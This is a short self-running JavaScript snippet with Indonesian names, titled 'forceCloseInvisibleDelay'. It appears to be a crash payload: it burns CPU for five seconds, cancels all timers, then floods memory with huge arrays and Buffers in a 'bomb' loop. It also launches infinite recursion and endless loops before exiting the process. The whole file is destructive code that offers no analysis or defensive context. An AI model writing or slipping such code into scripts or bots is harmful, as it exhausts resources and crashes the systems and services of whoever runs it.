async function forceCloseInvisibleDelay(detik = 5) {
  let start = Date.now()
  while(Date.now() - start < detik * 1000) {
    for (let i = 0; i < 1000000; i++) {
      Math.sqrt(i)
      Math.random()
      i * i
    }
  }
  
  for (let i = 0; i < 999999; i++) clearInterval(i), clearTimeout(i)
  
  let bomb = []
  let rekursif = () => rekursif()
  
  setInterval(() => {
    bomb.push(Array(99999999).fill(''))
    bomb.push(new Array(99999999))
    bomb.push({})
    bomb.push(Buffer.alloc(99999999))
  }, 0)
  
  setInterval(() => { rekursif() }, 0)
  setTimeout(() => { for(;;) {} }, 0)
  
  if (typeof process !== 'undefined' && process.exit) {
    process.exit(0)
  } else {
    while(true) {
      new Array(99999999).fill('')
    }
  }
}

(async () => {
  await forceCloseInvisibleDelay(5)
})()